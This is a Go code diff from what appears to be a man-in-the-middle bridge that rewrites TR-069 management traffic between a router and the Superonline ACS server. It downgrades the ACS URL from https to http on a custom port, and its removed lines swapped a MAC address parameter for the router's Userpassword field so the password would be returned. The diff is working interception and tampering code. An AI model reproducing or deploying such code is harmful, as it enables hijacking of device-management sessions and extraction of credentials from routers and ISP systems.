@@ -118,12 +118,16 @@ func processIncoming(packet gopacket.Packet) ([]byte, error) {
 	ip := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
 	tcp := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)
 
-	payload := tcp.Payload
+	payload := []byte{}
+	payload = append(payload, tcp.Payload...)
 
-	payload = bytes.Replace(payload, []byte("https://acs.superonline.net"), []byte("http://acs.superonline.net:8016"), -1)
-	payload = bytes.Replace(payload,
-		[]byte("InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.MACAddress"),
-		[]byte("InternetGatewayDevice.UserInterface.X_Web.UserInfo.1.Userpassword"), -1)
+	tcp.Payload = nil
+
+	if bytes.Index(payload, []byte("https://acs.superonline")) != -1 {
+		payload = bytes.Replace(payload, []byte("    <Value xsi:type=\"xsd:string\">https://acs.superonline.net/cwmpWeb/CPEMgt</Value>"),
+			[]byte("<Value xsi:type=\"xsd:string\">http://acs.superonline.net:8010/cwmpWeb/CPEMgt</Value>"), -1)
+
+	}
 
 	tcp.SetNetworkLayerForChecksum(ip)
 
@@ -247,7 +251,7 @@ func bridge(outgoingPort BridgePort, incomingPort BridgePort, label int) {
 			if label == OUTGOING && bytes.Equal(ip.DstIP, []byte{85, 29, 13, 3}) {
 				tcp, _ := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)
 
-				if tcp.DstPort == 8015 && len(tcp.Payload) > 0 {
+				if tcp.DstPort == 8010 && len(tcp.Payload) > 0 {
 					fmt.Printf("[+] Caught outgoing!\n")
 					packetData, err = processOutgoing(packet, true)
 					if err != nil {
